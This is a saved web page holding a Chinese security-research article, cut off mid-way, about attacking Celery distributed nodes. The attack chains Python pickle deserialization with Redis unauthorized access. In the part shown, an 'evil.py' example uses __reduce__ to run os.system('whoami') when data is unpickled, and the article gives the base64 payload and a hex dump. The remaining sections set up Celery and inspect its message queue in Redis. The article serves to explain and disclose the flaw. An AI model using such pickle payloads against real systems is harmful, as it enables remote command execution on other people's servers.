<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
    <meta name="renderer" content="webkit">
    <meta name="viewport" content="initial-scale=1.0,user-scalable=no,maximum-scale=1,width=device-width">
    <title>漏洞组合拳 &#8211; 攻击分布式节点 | MottoIN</title>
    <link rel='dns-prefetch' href='//www.mottoin.com' />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="MottoIN &raquo; 漏洞组合拳 &#8211; 攻击分布式节点评论Feed" href="http://www.mottoin.com/89644.html/feed" />
<link rel='stylesheet' id='stylesheet-css'  href='http://www.mottoin.com/wp-content/themes/JustNews/css/style.css?ver=2.3.2' type='text/css' media='all' />
<link rel='stylesheet' id='wpcom-qa-css'  href='http://www.mottoin.com/wp-content/plugins/wpcom-qa/css/style.css?ver=1.0' type='text/css' media='all' />
<style id='wpcom-qa-inline-css' type='text/css'>

        .q-content .topic-tab,.q-content .q-answer .as-user,.q-content .q-answer .as-comment-name{color: #1471CA;}
        .q-content .q-topic-wrap a:hover,.q-content .q-answer .as-action a:hover,.q-content .topic-tab:hover{color:#0D62B3;}
        .q-content .put-top,.q-content .topic-tab.current-tab,.q-content .q-answer .as-submit .btn-submit,.q-content .q-answer .as-comments-submit,.q-content .q-add-header .btn-post,.q-content .q-pagination .current{background-color:#1471CA;}
        .q-content .q-answer .as-submit .btn-submit:hover,.q-content .q-answer .as-comments-submit:hover,.q-content .q-add-header .btn-post:hover,.q-content .topic-tab.current-tab:hover,.q-content .q-pagination a:hover{background-color:#0D62B3;}
        .q-content .q-answer .as-comments-input:focus{border-color: #1471CA;}
        
</style>
<link rel='stylesheet' id='um_minified-css'  href='http://www.mottoin.com/wp-content/plugins/ultimate-member/assets/css/um.min.css?ver=10.3.88' type='text/css' media='all' />
<script type='text/javascript' src='http://www.mottoin.com/wp-content/themes/JustNews/js/jquery.min.js?ver=1.12.4'></script>
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://www.mottoin.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.mottoin.com/wp-includes/wlwmanifest.xml" /> 
<link rel='prev' title='Veil-Evasion：基于Python的免杀Payload生成工具' href='http://www.mottoin.com/89616.html' />
<link rel='next' title='京东首席信息安全专家Tony Lee: 重新思考安全问题本质' href='http://www.mottoin.com/89736.html' />
<link rel='shortlink' href='http://www.mottoin.com/?p=89644' />
<!--  WPCOM主题相关信息开始 -->
<meta name="applicable-device" content="pc,mobile">
<meta http-equiv="Cache-Control" content="no-transform">
<meta name="keywords" content="Celery 分布式框架,分布式系统,反序列化,攻击方法,数据篡改,未授权访问,漏洞组合,远程命令执行">
<meta name="description" content="分布式系统大都需要依赖于消息队列中间件来解决异步处理、应用耦合等问题，消息队列中间件的选择又依赖于整体系统的设计和实现，消息的封装、传递、处理贯穿了整个系统，如果在某一个关键处理逻辑点上出现了安全问题，那么整个分布式节点都有可能受到破坏。流行的开发语言几乎都存在序列化处理不当导致的命令执行问题，如Python里类的魔术方法__reduce__()会在pickle库进行反序列化的时候进行调用，PHP">
<!--  WPCOM主题相关信息结束 -->
 
		<script type="text/javascript">

		var ultimatemember_image_upload_url = 'http://www.mottoin.com/wp-content/plugins/ultimate-member/core/lib/upload/um-image-upload.php';
		var ultimatemember_file_upload_url = 'http://www.mottoin.com/wp-content/plugins/ultimate-member/core/lib/upload/um-file-upload.php';
		var ultimatemember_ajax_url = 'http://www.mottoin.com/wp-admin/admin-ajax.php';

		</script>

	
		<style type="text/css">.request_name { display: none !important; }</style>

	<link rel="icon" href="http://www.mottoin.com/wp-content/uploads/2016/12/cropped-Avatar-32x32.jpg" sizes="32x32" />
<link rel="icon" href="http://www.mottoin.com/wp-content/uploads/2016/12/cropped-Avatar-192x192.jpg" sizes="192x192" />
<link rel="apple-touch-icon-precomposed" href="http://www.mottoin.com/wp-content/uploads/2016/12/cropped-Avatar-180x180.jpg" />
<meta name="msapplication-TileImage" content="http://www.mottoin.com/wp-content/uploads/2016/12/cropped-Avatar-270x270.jpg" />
    <style>
                a,.sec-panel-head span,.list.tabs .tab.active a,.header .nav>li.active>a,.header .dropdown-menu>.active>a,.entry .entry-info .nickname,.entry-bar-inner .author-title,.entry-action .btn-zan,.entry-action .btn-dashang,.comment-body .nickname,.form-submit-text span,.widget_profile .author-title,.um .um-profile-body .um-item-meta a,.login-modal-body .btn-register{color: #08c;}
        .header .dropdown-menu>li>a:hover,.header .dropdown-menu>.active>a:hover,.header .dropdown-menu>.active>a:focus,.navbar-action .publish,.pagination .current,.flex-control-paging li a.flex-active,.form-submit .submit,.sidebar .widget_nav_menu ul li.current-menu-item a,.sidebar .widget_nav_menu ul li.current-post-parent a,.search-form input.submit,.action .contact-title,.pf-submit,.tagHandler ul.tagHandlerContainer li.tagItem,.login-modal-body .btn-login,.woocommerce a.button,.woocommerce button.button,.woocommerce input.button,.woocommerce a.button.alt,.woocommerce button.button.alt,.woocommerce input.button.alt,.woocommerce a.button.alt.disabled,.woocommerce a.button.alt.disabled:hover,.woocommerce a.button.alt:disabled,.woocommerce a.button.alt:disabled:hover,.woocommerce a.button.alt:disabled[disabled],.woocommerce a.button.alt:disabled[disabled]:hover,.woocommerce button.button.alt.disabled,.woocommerce button.button.alt.disabled:hover,.woocommerce button.button.alt:disabled,.woocommerce button.button.alt:disabled:hover,.woocommerce button.button.alt:disabled[disabled],.woocommerce button.button.alt:disabled[disabled]:hover,.woocommerce input.button.alt.disabled,.woocommerce input.button.alt.disabled:hover,.woocommerce input.button.alt:disabled,.woocommerce input.button.alt:disabled:hover,.woocommerce input.button.alt:disabled[disabled],.woocommerce input.button.alt:disabled[disabled]:hover,.woocommerce .widget_price_filter .ui-slider .ui-slider-handle,.woocommerce .widget_price_filter .ui-slider .ui-slider-range,.shopping-count,.social-login-form .sl-input-submit{background-color: #08c;}
        .entry .entry-content h3,.entry .entry-content .h3,.widget-title{border-left-color: #08c;}
        .entry-bar-inner .author-title,.entry-action .btn-zan,.entry-action .btn-dashang,.search-form input.keyword:focus,.widget_profile .author-title,.login-modal-body .btn-login,.login-modal-body .btn-register{border-color: #08c;}
        .entry-bar-inner .author-title:before,.widget_profile .author-title:before{border-right-color: #08c;}
        .list.tabs .tab.active a{border-bottom-color: #08c;}

        a:hover,.header .nav>li>a:hover,.header .nav>li.active>a,.navbar-action .login:hover,.navbar-action .login:focus,.navbar-action .profile a:hover,.navbar-search-icon:hover,.navbar-search-icon:focus,.entry .entry-info a:hover,.entry .entry-info a:focus,.entry-bar .info-item a:hover,.p-item-wrap:hover .title a,.special-item-title a:hover,.special-item-bottom a:hover,.widget ul a:hover,.widget ol a:hover,.sec-panel-head .more:hover,.topic-list .topic-wrap:hover span,.tabs .tab a:hover,
        .article-list .item-title a:hover,.article-list .item-meta a:hover,.article-list .item-meta a:focus,.list-links a:hover,.list-links a:focus,.um .um-profile-body .um-item-meta a:hover,.um .um-profile-body .um-item-link a:hover,.load-more:hover,.login-modal-body .btn-register:hover{color: #07c;}
        .navbar-action .publish:hover,.navbar-action .publish:focus,.entry-tag a:hover,.entry-tag a:focus,.entry-action .btn-zan:hover,.entry-action .btn-dashang:hover,.entry-action .btn-zan.liked,.pagination a:hover,.flex-control-paging li a:hover,.form-submit .submit:hover,.widget .tagcloud a:hover,.sidebar .widget_nav_menu ul li.current-menu-item .sub-menu a:hover,.sidebar .widget_nav_menu ul li.current-post-parent .sub-menu a:hover,.sidebar .widget_nav_menu ul li a:hover,.search-form input.submit:hover,.action .a-box:hover,.footer-sns .fa:after,.article-list .item-category:hover,.pf-submit:hover,.tagHandler ul.tagHandlerContainer li.tagItem:hover,.login-modal-body .btn-login:hover,.woocommerce a.button:hover,.woocommerce button.button:hover,.woocommerce input.button:hover,.woocommerce a.button.alt:hover,.woocommerce button.button.alt:hover,.woocommerce input.button.alt:hover,.woocommerce .widget_price_filter .price_slider_wrapper .ui-widget-content,.social-login-form .sl-input-submit:hover{background-color: #07c;}
        .entry-tag a:hover,.entry-tag a:focus,.entry-action .btn-zan:hover,.entry-action .btn-dashang:hover,.entry-action .btn-zan.liked,.widget .tagcloud a:hover,.load-more:hover,.login-modal-body .btn-login:hover,.login-modal-body .btn-register:hover{border-color: #07c;}
        .special-item-bottom a:hover:before{border-left-color: #07c;}
        .list.tabs .tab.active a:hover{border-bottom-color: #07c;}
        @media (max-width: 991px){
            .header .navbar-nav>li.active>a,.header .navbar-nav .dropdown-menu .active a,.header .navbar-nav .dropdown-menu .active .dropdown-menu .active a{color: #08c;}
            .navbar-collapse{background-color: #08c;}
            .dropdown-menu>li a{border-color: #07c;}
            .header .navbar-nav>li.active>a:hover,.header .navbar-nav>li a:hover,.header .navbar-nav .dropdown-menu .active a:hover,.header .navbar-nav .dropdown-menu .active .dropdown-menu a:hover,.header .navbar-nav .dropdown-menu li a:hover{color: #07c;}
        }
        .j-share{position: fixed!important;top: 50%!important;}
                .header .logo img{max-height: 32px;}
                @media (max-width: 767px){
            .header .logo img{max-height: 26px;}
        }
                        .btn-post{
    display: block;
    margin: 0 auto;
    padding: 15px 20px;
    font-size: 16px;
    text-align: center;
    color: #fff !important;
    line-height: 1;
    background: #1471CA;
    -webkit-border-radius: 3px;
    border-radius: 3px;
    text-decoration: none;
    border: 0;
    outline: 0;
}    </style>
    <script> (function() {if (!/*@cc_on!@*/0) return;var e = "abbr, article, aside, audio, canvas, datalist, details, dialog, eventsource, figure, footer, header, hgroup, mark, menu, meter, nav, output, progress, section, time, video".split(', ');var i= e.length; while (i--){ document.createElement(e[i]) } })()</script>
    <!--[if lte IE 8]><script src="http://www.mottoin.com/wp-content/themes/JustNews/js/respond.min.js"></script><![endif]-->
</head>
<body class="post-template-default single single-post postid-89644 single-format-standard">
<header class="header">
    <div class="container clearfix">
        <div class="navbar-header">
            <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target=".navbar-collapse">
                <span class="icon-bar icon-bar-1"></span>
                <span class="icon-bar icon-bar-2"></span>
                <span class="icon-bar icon-bar-3"></span>
            </button>
            <a class="logo" href="http://www.mottoin.com"><img src="http://www.mottoin.com/img/mottoin/logo.png" alt="MottoIN"></a>
        </div>
        <div class="collapse navbar-collapse">
            <nav class="navbar-left primary-menu"><ul id="menu-%e5%af%bc%e8%88%aa" class="nav navbar-nav"><li class="menu-item menu-item-home"><a href="http://www.mottoin.com/">首页</a></li>
<li class="menu-item"><a href="http://www.mottoin.com/category/news">资讯</a></li>
<li class="menu-item current-post-ancestor dropdown"><a href="http://www.mottoin.com/category/article" class="dropdown-toggle">文章</a>
<ul role="menu" class=" dropdown-menu">
	<li class="menu-item current-post-ancestor current-menu-parent current-post-parent"><a href="http://www.mottoin.com/category/article/web">Web安全</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/system">系统安全</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/network">网络安全</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/terminal">终端安全</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/database">数据安全</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/wireless">无线安全</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/social">社会工程</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/intranet">内网渗透</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/code">代码审计</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/article/reverse">逆向破解</a></li>
</ul>
</li>
<li class="menu-item"><a href="http://www.mottoin.com/category/tools">工具</a></li>
<li class="menu-item"><a href="http://www.mottoin.com/category/geek">极客</a></li>
<li class="menu-item dropdown"><a href="http://www.mottoin.com/category/sole" class="dropdown-toggle">独家</a>
<ul role="menu" class=" dropdown-menu">
	<li class="menu-item"><a href="http://www.mottoin.com/category/sole/topic">专题</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/sole/people">人物</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/sole/view">观点</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/sole/events">活动</a></li>
	<li class="menu-item"><a href="http://www.mottoin.com/category/sole/video">视频</a></li>
</ul>
</li>
<li class="menu-item"><a href="http://www.mottoin.com/category/hr">招聘</a></li>
<li class="menu-item"><a href="http://www.mottoin.com/forum">社区</a></li>
</ul></nav>            <div class="navbar-action pull-right">

                                    <form class="navbar-search" action="http://www.mottoin.com" method="get" role="search">
                        <input type="text" name="s" class="navbar-search-input" autocomplete="off" placeholder="输入关键词搜索..." value="">
                        <a class="navbar-search-icon j-navbar-search" href="javascript:;"></a>
                    </form>

                    
                    <div id="j-user-wrap">
                        <a class="login" href="http://www.mottoin.com/login">登录</a>
                        <a class="login" href="http://www.mottoin.com/register">注册</a>
                    </div>
                    <a class="publish" href="http://www.mottoin.com/post">
                        投稿</a>
                                                </div>
        </div><!-- /.navbar-collapse -->
    </div><!-- /.container -->
</header>
<div id="wrap">    <div class="main container">
        <div class="content">
                            <article id="post-89644" class="post-89644 post type-post status-publish format-standard has-post-thumbnail hentry category-web category-tech tag-celery- tag-1427 tag-485 tag-1430 tag-1429 tag-1141 tag-1428 tag-1184">
                    <div class="entry">
                        <div class="entry-head">
                            <h1 class="entry-title">漏洞组合拳 &#8211; 攻击分布式节点</h1>
                            <div class="entry-info">
                                                                <a class="nickname" href="http://www.mottoin.com/user/lycxk/">Sam</a>
                                <span class="dot">•</span>
                                <span>2016年9月22日</span>
                                <span class="dot">•</span>
                                <a href="http://www.mottoin.com/category/article/web" rel="category tag">Web安全</a>, <a href="http://www.mottoin.com/category/tech" rel="category tag">技术控</a>                                                                    <span class="dot">•</span>
                                    <span>阅读 1210</span>
                                                            </div>
                        </div>
                                                                        <div class="entry-content clearfix">
                            <p>分布式系统大都需要依赖于消息队列中间件来解决异步处理、应用耦合等问题，消息队列中间件的选择又依赖于整体系统的设计和实现，消息的封装、传递、处理贯穿了整个系统，如果在某一个关键处理逻辑点上出现了安全问题，那么整个分布式节点都有可能受到破坏。</p>
<p>流行的开发语言几乎都存在序列化处理不当导致的命令执行问题，如 Python 里类的魔术方法 __reduce__() 会在 pickle 库进行反序列化的时候进行调用，PHP 中类的魔术方法 __wakup() 同样也会在实例进行反序列化的时候调用等等。</p>
<p>从开发者角度看来，开发语言提供的数据序列化方式方便了实例对象进行跨应用传递，程序A 和 程序B 能够通过序列化数据传递方式来远程访问实例对象或者远程调用方法（如 Java 中的 RMI）；而站在安全研究者角度，这种跨应用的数据传递或者调用方式可能存在对象数据篡改和方法恶意调用的安全隐患。</p>
<p>在消息队列的实现中，消息数据的序列化（封装）方式就成了一颗定时炸弹，不安全的序列化方式可能会导致消息数据被篡改，从而引发反序列化（数据解析）后的一些列安全问题。</p>
<p>消息队列中间件的选择也是一大问题，常见的有 RabbitMQ，ActiveMQ，Kafka，Redis 等，而像 Redis 这种存在未授权访问问题的组件如果被攻击者所控制，即可通过组件直接向消息队列中插入数据，轻则影响整个分布式节点的逻辑处理，重则直接插入恶意数据结合反序列化等问题对节点群进行攻击。</p>
<p>说了这么多，总结一下上面提到的几个安全问题：</p>
<ol>
<li>各语言中存在的序列化问题可直接导致远程命令执行；</li>
<li>消息队列的实现常常会直接使用语言自身的序列化（或相似的）方式封装消息；</li>
<li>分布式系统使用的消息队列中间件种类繁多，其中某些分布式框架使用了像 Redis 这种存在着未授权访问问题的组件；</li>
<li>消息队列中消息的篡改会直接或间接影响到分布式节点；</li>
</ol>
<p>将这 4 个安全问题或者说是漏洞结合在一起，即可成为一种可直接入侵和破坏分布式节点的攻击方法。那么，是否存在真正满足上述问题的实例呢？目前，已经发现了 Python 中 Celery 分布式框架确实存在这样的问题，下面我会针对上诉 4 个问题以 Celery 分布式框架为例来说明如何攻击分布式节点打出漏洞组合拳。</p>
<h2 id="python-">一、老生常谈 Python 序列化</h2>
<p>Celery 分布式框架是由 Python 语言所编写的，为了下面更好的说明问题，所以这里首先简单的回顾一下 Python 序列化的安全问题。</p>
<h3 id="section">1. 简单的序列化例子</h3>
<p>Python 中有这么一个名为 <code class="highlighter-rouge">pickle</code> 的模块用于实例对象的序列化和反序列化，一个简单的例子：<code class="hljs python"> </code></p>
<div>
<pre><code class="lang-python">import base64
import pickle

class MyObj(object):
    loa = 'hello my object'

t_obj = MyObj()
serialized = base64.b64encode(pickle.dumps(t_obj))
print('--&gt; pickling MyObj instance {} and Base64 it\ngot "{}"'.format(t_obj, serialized))
print('--&gt; unpickling serialized data\nwith "{}"'.format(serialized))
obj = pickle.loads(base64.b64decode(serialized))
print('** unpickled object is {}'.format(obj))
print('{} -&gt; loa = {}'.format(obj, obj.loa))</code></pre>
</div>
<p>因 pickle 模块对实例对象进行序列化时产生的是二进制结构数据，传输的时候常常会将其进行 Base64 编码，这样可以有效地防止字节数据丢失。上面的程序作用是将一个 MyObj 类实例进行序列化并进行 Base64 编码然后进行解码反序列化重新得到实例的一个过程，运行程序后得到输出：</p>
<p><a href="http://www.mottoin.com/89644.html/1-241" rel="attachment wp-att-89645"><img class="aligncenter wp-image-89645 size-full j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/09/1-41.png" alt="1" width="1872" height="266" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/09/1-41.png 1872w, http://www.mottoin.com/wp-content/uploads/2016/09/1-41-300x43.png 300w, http://www.mottoin.com/wp-content/uploads/2016/09/1-41-768x109.png 768w, http://www.mottoin.com/wp-content/uploads/2016/09/1-41-1024x146.png 1024w" sizes="(max-width: 1872px) 100vw, 1872px" /></a></p>
<p>通过截图可以看到序列化前和序列化后的实例是不同的（对象地址不同），并且通常反序列化时实例化一个类实例，当前的运行环境首先必须定义了该类型才能正常序列化，否则可能会遇到找不到正确类型无法进行反序列化的情况，例如将上诉过程分文两个文件 serializer.py 和 unserializer.py，前一个文件用于实例化 MyObj 类并将其序列化然后经 Base64 编码输出，而后一个文件用于接收一串字符串，将其 Base64 解码后进行反序列化：</p>
<div>
<pre><code class="lang-python"># serializer.py
import base64
import pickle
class MyObj(object):
    loa = 'hello my object'
print(base64.b64encode(pickle.dumps(MyObj())))</code></pre>
</div>
<div>
<pre><code class="lang-python"># unserializer.py
import sys
import base64
import pickle
print(pickle.loads(base64.b64decode(sys.argv[1])))</code></pre>
</div>
<p>就上面所说，在反序列化时如果环境中不存在反序列化类型的定义，因为 unserializer.py 中未定义 MyObj 类，则在对 serializer.py 输出结果进行反序列化时会失败报错，提示找不到 MyObj：</p>
<p><a href="http://www.mottoin.com/89644.html/2-229" rel="attachment wp-att-89646"><img class="aligncenter wp-image-89646 size-full j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/09/2-40.png" alt="2" width="1852" height="674" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/09/2-40.png 1852w, http://www.mottoin.com/wp-content/uploads/2016/09/2-40-300x109.png 300w, http://www.mottoin.com/wp-content/uploads/2016/09/2-40-768x279.png 768w, http://www.mottoin.com/wp-content/uploads/2016/09/2-40-1024x373.png 1024w" sizes="(max-width: 1852px) 100vw, 1852px" /></a></p>
<h3>2. Trick 使得反序列化变得危险</h3>
<p>看似反序列化并不能实例化任意对象（运行环境依赖），但有那么些 tricks 可以达到进行反序列化即可任意代码执行的效果。</p>
<p>如果一个类定义了 __reduce__() 函数，那么在对其实例进行反序列化的时候，pickle 会通过 __reduce__() 函数去寻找正确的重新类实例化过程。（__reduce__() 函数<a href="https://docs.python.org/2/library/pickle.html#object.__reduce__">详细文档参考</a>）</p>
<p>例如这里我在 MyObj 类中定义 __reduce__() 函数：</p>
<div>
<pre><code class="lang-python">...
class MyObj(object):
    loa = 'hello my object'
    def __reduce__(self):
        return (str, ('replaced by __reduce__() method', ))
...</code></pre>
</div>
<p>然后再执行上一节的程序过程，会直接得到输出：</p>
<p><a href="http://www.mottoin.com/89644.html/3-198" rel="attachment wp-att-89647"><img class="aligncenter wp-image-89647 size-full j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/09/3-36.png" alt="3" width="1852" height="204" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/09/3-36.png 1852w, http://www.mottoin.com/wp-content/uploads/2016/09/3-36-300x33.png 300w, http://www.mottoin.com/wp-content/uploads/2016/09/3-36-768x85.png 768w, http://www.mottoin.com/wp-content/uploads/2016/09/3-36-1024x113.png 1024w" sizes="(max-width: 1852px) 100vw, 1852px" /></a></p>
<p>这里不再报错是因为，MyObj 在进行序列化的时候，将重新构建类的过程写进了序列化数据里，pickle 在进行反序列化的时候会遵循重建过程去执行相应操作，这里是使用内置的 str 函数去操作参数 &#8216;replaced by __reduce__() method&#8217; 并返回，所以成功反序列化并输出的字符串。</p>
<p>有了 <code class="highlighter-rouge">__reduce__()</code> 这个函数，就可以利用该特性在反序列化的时候直接执行任意代码了，如下示例代码：</p>
<div>
<pre><code class="lang-python"># evil.py
import os
import base64
import pickle
class CMD(object):
    def __reduce__(self):
        return (os.system, ('whoami', ))
print(base64.b64encode(pickle.dumps(CMD())))</code></pre>
</div>
<p>运行得到编码后的序列化数据：</p>
<div>
<pre><code class="lang-python">Y3Bvc2l4CnN5c3RlbQpwMAooUyd3aG9hbWknCnAxCnRwMgpScDMKLg==</code></pre>
</div>
<p>这里需要主要的是 os.system(&#8216;whoami&#8217;) 这个过程不是在序列化过程执行的，而是将这个过程以结构化的数据存于了序列化数据中，这里可以看一下二进制序列化数据：</p>
<div>
<pre><code class="lang-python">➜  demo echo -n "Y3Bvc2l4CnN5c3RlbQpwMAooUyd3aG9hbWknCnAxCnRwMgpScDMKLg==" | base64 -D | xxd
0000000: 6370 6f73 6978 0a73 7973 7465 6d0a 7030  cposix.system.p0
0000010: 0a28 5327 7768 6f61 6d69 270a 7031 0a74  .(S'whoami'.p1.t
0000020: 7032 0a52 7033 0a2e                      p2.Rp3..
➜  demo</code></pre>
</div>
<p>数据都是以 Python pickle 序列化数据结构进行整合的，具体底层协议实现可参考官方文档。</p>
<p>对上面的序列化数据使用 unserializer.py 进行反序列化操作时，会触发类重构操作，从何执行 os.system(&#8216;whoami&#8217;)：</p>
<p><a href="http://www.mottoin.com/89644.html/4-174" rel="attachment wp-att-89648"><img class="aligncenter wp-image-89648 size-full j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/09/4-29.png" alt="4" width="1848" height="208" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/09/4-29.png 1848w, http://www.mottoin.com/wp-content/uploads/2016/09/4-29-300x34.png 300w, http://www.mottoin.com/wp-content/uploads/2016/09/4-29-768x86.png 768w, http://www.mottoin.com/wp-content/uploads/2016/09/4-29-1024x115.png 1024w" sizes="(max-width: 1848px) 100vw, 1848px" /></a></p>
<p>历史上框架或者应用由于 Python 反序列化问题导致的任意命令执行并不少见，如 Django 低版本使用了 pickle 作为 Session 数据默认的序列化方式，在设置了使用 Cookie 进行 Session 数据存储的时候，会使得攻击者直接构造恶意 Cookie 值，触发恶意的反序列化进行任意命令执行；又一些程序可接受一串序列化数据作为输入，如 SQLMAP 之前的 &#8211;pickled-options 运行参数就可以传入由 pickle 模块序列化后的数据。虽然官方有对 pickle 模块进行安全声明，指明了不要反序列化未受信任的数据来源，但是现实应用逻辑繁杂，常会有这样的数据可控的点出现，也是不太好避免的。</p>
<h2 id="celery">二、分布式框架 Celery</h2>
<p>回顾完 Python 序列化的问题，这时候转过来看一下 Celery 这个分布式框架。</p>
<h3 id="section-1">1. 使用框架进行简单的任务下发</h3>
<p>Celery 借助消息队列中间件进行消息（任务）的传递，一个简单利用 Celery 框架进行任务下发并执行的例子：</p>
<div>
<pre><code class="lang-python"># celery_simple.py
from celery import Celery
app = Celery('demo', broker='amqp://192.168.99.100//', backend='amqp://192.168.99.100//')
@app.task
def add(x, y):
    return x + y</code></pre>
</div>
<p>Celery 推荐使用 RabbitMQ 作为 Broker，这里直接在 <code class="highlighter-rouge">192.168.99.100</code> 主机上开启 RabbitMQ 服务，然后在终端使用 celery 命令起一个 worker：</p>
<div>
<pre><code class="lang-python">celery worker -A celery_simple.app -l DEBUG</code></pre>
</div>
<p>然后另起一个 ipython 导入 <code class="highlighter-rouge">celery_simple</code> 模块中的 <code class="highlighter-rouge">add()</code> 函数，对其进行调用并获取结果：</p>
<div>
<pre><code class="lang-python">In [1]: from celery_simple import add
In [2]: task = add.apply_async((4, 5))
In [3]: task.result
Out[3]: 9</code></pre>
</div>
<p>&nbsp;</p>
<p><a href="http://www.mottoin.com/89644.html/5-159" rel="attachment wp-att-89649"><img class="aligncenter wp-image-89649 size-full j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/09/5-30.png" alt="5" width="1854" height="692" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/09/5-30.png 1854w, http://www.mottoin.com/wp-content/uploads/2016/09/5-30-300x112.png 300w, http://www.mottoin.com/wp-content/uploads/2016/09/5-30-768x287.png 768w, http://www.mottoin.com/wp-content/uploads/2016/09/5-30-1024x382.png 1024w" sizes="(max-width: 1854px) 100vw, 1854px" /></a></p>
<h3>2. 框架中的消息封装方式</h3>
<p>本文并不关心框架的具体实现和用法，只关心消息的具体封装方式。在 Celery 框架中有多种可选的消息序列化方式：</p>
<ul>
<li><strong>pickle</strong></li>
<li>json</li>
<li>msgpack</li>
<li>yaml</li>
<li>…</li>
</ul>
<p>可以看到 Celery 框架所使用的消息序列化方式中含有 pickle 的序列化方式，上一部分已经说明了 Python 中 pickle 序列化方式存在的安全隐患，而 Celery 框架却支持这种方式对消息进行封装，并且在 4.0.0 版本以前默认使用的也是 pickle 序列化方式。</p>
<p>为了弄明白 Celery 的消息格式，这里将 Broker 换成 Redis 方便直接查看数据。</p>
<div>
<pre><code class="lang-python"># celery_simple.py
from celery import Celery
app = Celery('demo', broker='redis://:@192.168.99.100:6379/0', backend='redis://:@192.168.99.100:6379/0')
@app.task
def add(x, y):
    return x + y</code></pre>
</div>
<p>这里先不起 worker 进程，直接使用 ipython 进行任务下发：</p>
<div>
<pre><code class="lang-python">In [1]: from celery_simple import add
In [2]: task = add.apply_async((4, 9))</code></pre>
</div>
<p>这时候查看 Redis 里面的数据：</p>
<p><a href="http://www.mottoin.com/89644.html/6-144" rel="attachment wp-att-89652"><img class="aligncenter wp-image-89652 size-full j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/09/6-28.png" alt="6" width="1858" height="258" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/09/6-28.png 1858w, http://www.mottoin.com/wp-content/uploads/2016/09/6-28-300x42.png 300w, http://www.mottoin.com/wp-content/uploads/2016/09/6-28-768x107.png 768w, http://www.mottoin.com/wp-content/uploads/2016/09/6-28-1024x142.png 1024w" sizes="(max-width: 1858px) 100vw, 1858px" /></a></p>
<p>可以看到 Redis 里面存在两个键，celery 和 _kombu.binding.celery，这里解释一下具体两个键的具体含义。在 Celery 中消息可以根据路由设置分发到不同的任务上，例如这里 add() 函数由于没有进行特别的设置，所以其所处的消息队列为名为 celery 的队列，exchange 和 routing_key 值都为 celery，所有满足路由（{&#8220;queue&#8221;:&#8221;celery&#8221;,&#8221;exchange&#8221;:&#8221;celery&#8221;,&#8221;routing_key&#8221;:&#8221;celery&#8221;}）的消息都会发到该 worker 上，然后 worker 根据具体的调用请求去寻找注册的函数使用参数进行调用。</p>
<p>而刚刚提到的 Reids 中的键 _kombu.binding.celery 表示存在一个名为 celery 的队列，其 exchange 和 routing_key 的信息保存在该集合里：</p>
<p><a href="http://www.mottoin.com/89644.html/7-124" rel="attachment wp-att-89653"><img class="aligncenter wp-image-89653 size-full j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/09/7-26.png" alt="7" width="1860" height="102" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/09/7-26.png 1860w, http://www.mottoin.com/wp-content/uploads/2016/09/7-26-300x16.png 300w, http://www.mottoin.com/wp-content/uploads/2016/09/7-26-768x42.png 768w, http://www.mottoin.com/wp-content/uploads/2016/09/7-26-1024x56.png 1024w" sizes="(max-width: 1860px) 100vw, 1860px" /></a></p>
<p>而键 <code class="highlighter-rouge">celery</code> 里面存储的就是每一个 push 到队列里面的具体消息信息：</p>
<p><a href="http://www.mottoin.com/89644.html/8-111" rel="attachment wp-att-89654"><img class="aligncenter wp-image-89654 size-full j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2016/09/8-23.png" alt="8" width="1858" height="320" data-srcset="http://www.mottoin.com/wp-content/uploads/2016/09/8-23.png 1858w, http://www.mottoin.com/wp-content/uploads/2016/09/8-23-300x52.png 300w, http://www.mottoin.com/wp-content/uploads/2016/09/8-23-768x132.png 768w, http://www.mottoin.com/wp-content/uploads/2016/09/8-23-1024x176.png 1024w" sizes="(max-width: 1858px) 100vw, 1858px" /></a></p>
<p>可以看到是一个 JSON 格式的数据，为了更方便的进行字段分析，将其提出来格式化显示为：</p>
<div>
<pre><code class="lang-python">{
